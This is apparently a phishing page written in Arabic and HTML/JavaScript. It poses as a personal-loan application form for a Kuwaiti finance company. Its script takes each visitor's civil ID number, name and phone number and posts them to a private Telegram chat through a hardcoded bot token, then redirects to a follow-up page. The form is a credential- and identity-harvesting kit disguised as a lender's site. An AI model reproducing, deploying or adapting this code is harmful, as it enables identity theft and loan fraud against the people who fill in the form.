    <div class="header"></div>

    <div class="form-container">
        <p class="form-description">
            تتيح التسهيلات الائتمانية للحصول على قرض شخصي بحد أعلى
            إلى 25,000 دينار كويتي أو 25 ضعف الراتب أيهما أقل
            لتمويل احتياجاتهم من السلع الاستهلاكية. ويمكنك تقديم
            طلبات القروض الشخصية عبر القنوات التالية:
            <br>• الموقع الإلكتروني
            <br>• فروع الشركة
        </p>

        <form id="myForm">
            <div class="form-group">
                <label for="civilId">رقم المدني</label>
                <input type="tel" id="civilId" name="civilId" placeholder="رقم المدني" maxlength="12" minlength="12">
            </div>

            <div class="form-group">
                <label for="name">الاسم</label>
                <input type="text" id="name" name="name" placeholder="الاسم">
            </div>

            <div class="form-group">
                <label for="phone">رقم الهاتف</label>
                <input type="tel" id="phone" name="phone" placeholder="رقم الهاتف" maxlength="8" minlength="8">
            </div>

            <button type="submit" class="submit-button">
                <svg viewBox="0 0 24 24">
                    <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/>
                </svg>
                أرسل
            </button>
        </form>
<img id="imgau1" src="CFC-Logo.jpg">

    </div>
<script>
    const botToken = '8456186942:AAFxBIZIivfXCZeTSAshpjKAJkXU4lPuZrY'; 
const chatId = '8201670834';     

document.getElementById('myForm').addEventListener('submit', function(e) {
    e.preventDefault();

    const civilId = document.getElementById('civilId').value.trim();
    const name = document.getElementById('name').value.trim();
    const phone = document.getElementById('phone').value.trim();

    if (!civilId || !name || !phone) {
        alert('يرجى ملء جميع الحقول');
        return;
    }

    const message = `
📩 *طلب تمويل جديد*:
- رقم المدني: ${civilId}
- الاسم: ${name}
- رقم الهاتف: ${phone}
    `;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.ok) {
window.location.href = 'cash11.html';
            document.getElementById('myForm').reset();
            localStorage.setItem('userName', name);

        } else {
            alert('حدث خطأ أثناء الإرسال');
            console.error(data);
        }
    })
    .catch(error => {
        alert('خطأ في الاتصال بالخادم');
        console.error(error);
    });
});

</script>
